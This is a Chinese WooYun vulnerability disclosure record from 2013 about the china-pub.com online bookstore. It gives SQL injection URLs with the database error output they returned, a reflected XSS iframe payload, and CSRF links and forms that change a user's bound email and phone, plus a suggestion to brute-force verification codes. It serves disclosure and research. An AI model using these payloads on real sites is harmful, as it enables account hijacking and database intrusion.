{"id": 13235, "wybug_id": "wooyun-2013-019926", "wybug_title": "中国互动出版网SQL注入等漏洞", "wybug_corp": "中国互动出版网", "wybug_author": "blast", "wybug_date": "2013-03-12 12:47", "wybug_open_date": "2013-04-26 12:47", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["修改绑定账户"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-04-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql注入漏洞、csrf修改绑定邮箱、反射型xss等 详细说明：  SQL注入：http://member.china-pub.com/Car/OrderDetail.aspx?o=4206136 and 1=(select @@VERSION)Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) May  3 2005 23:18:38 Copyright (c) 1988-2003 Microsoft CorporationEnterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 4)GET请求CSRF:http://www.china-pub.com/member/mypub2010/user/userchanges_ajax.asp?act=yzemail&email=yourmail@qq.comXSS：http://www.china-pub.com/member/mypub2010/user/ver_tel.asp?mobile=&yzm=%22%3E%3Ciframe%20src=http://g.cn%3E绑定手机号CSRF，发送验证码的操作可以通过XSS调用：\n<form action=\"http://www.china-pub.com/member/mypub2010/user/ver_tel.asp\" method=\"post\"><input name=\"ym\" value=\"3124\"/><input name=\"yz\" value=\"2\"/><input name=\"x\" value=\"65\"/><input name=\"y\" value=\"26\" type=\"submit\"/></form>\n利用上面的XSS从1－10000头到尾POST一遍估计就出来了   漏洞证明：  http://member.china-pub.com/Car/OrderDetail.aspx?o=4206136 and 1=(select @@VERSION)Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) May  3 2005 23:18:38 Copyright (c) 1988-2003 Microsoft CorporationEnterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 4)http://member.china-pub.com/Car/OrderDetail.aspx?o=4206136 And 1=(select db_name())dbinfohttp://member.china-pub.com/Car/OrderDetail.aspx?y=2013&s=5&o=4206136%20OR%204206137%22--字符串 '-- and member='awsotr'  order by cpub_shopping_member_info.orderid desc' 之前有未闭合的引号。第 1 行: '-- and member='awsotr'  order by cpub_shopping_member_info.orderid desc' 附近有语法错误。Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.Exception Details: System.Data.SqlClient.SqlException: 字符串 '-- and member='awsotr'  order by cpub_shopping_member_info.orderid desc' 之前有未闭合的引号。第 1 行: '-- and member='awsotr'  order by cpub_shopping_member_info.orderid desc' 附近有语法错误。\n\n\n改邮箱：<img src=\"http://www.china-pub.com/member/mypub2010/user/userchanges_ajax.asp?act=yzemail&email=yourmail@qq.com\">\n   修复方案：  关闭错误回显检查请求来源   版权声明：转载请注明来源 blast@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}